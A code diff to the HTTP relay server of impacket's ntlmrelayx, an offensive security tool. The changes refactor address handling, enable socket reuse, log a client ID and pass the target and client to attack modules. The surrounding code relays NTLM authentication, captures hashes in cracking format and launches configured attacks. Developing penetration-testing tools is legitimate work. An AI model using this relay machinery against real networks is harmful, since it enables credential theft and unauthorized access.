@@ -33,6 +33,7 @@ from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
 from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
 from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
+from impacket.examples.utils import get_address
 
 class HTTPRelayServer(Thread):
 
@@ -40,11 +41,11 @@ class HTTPRelayServer(Thread):
         def __init__(self, server_address, RequestHandlerClass, config):
             self.config = config
             self.daemon_threads = True
-            if self.config.ipv6:
-                self.address_family = socket.AF_INET6
+            self.address_family, server_address = get_address(server_address[0], server_address[1], self.config.ipv6)
             # Tracks the number of times authentication was prompted for WPAD per client
             self.wpad_counters = {}
-            socketserver.TCPServer.__init__(self,server_address, RequestHandlerClass)
+            socketserver.TCPServer.allow_reuse_address = True
+            socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)
 
     class HTTPHandler(http.server.SimpleHTTPRequestHandler):
         def __init__(self,request, client_address, server):
@@ -464,7 +465,8 @@ class HTTPRelayServer(Thread):
                         self.do_AUTHHEAD(b'NTLM', proxy=proxy)
                 else:
                     # Relay worked, do whatever we want here...
-                    LOG.info("(HTTP): Authenticating connection from %s@%s against %s://%s SUCCEED" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc))
+                    self.client.setClientId()
+                    LOG.info("(HTTP): Authenticating connection from %s@%s against %s://%s SUCCEED [%s]" % (self.authUser, self.client_address[0], self.target.scheme, self.target.netloc, self.client.client_id))
 
                     ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
                                                         authenticateMessage['user_name'],
@@ -530,7 +532,7 @@ class HTTPRelayServer(Thread):
             if self.target.scheme.upper() in self.server.config.attacks:
                 # We have an attack.. go for it
                 clientThread = self.server.config.attacks[self.target.scheme.upper()](self.server.config, self.client.session,
-                                                                               self.authUser)
+                                                                               self.authUser, self.target, self.client)
                 clientThread.start()
             else:
                 LOG.error('(HTTP): No attack configured for %s' % self.target.scheme.upper())
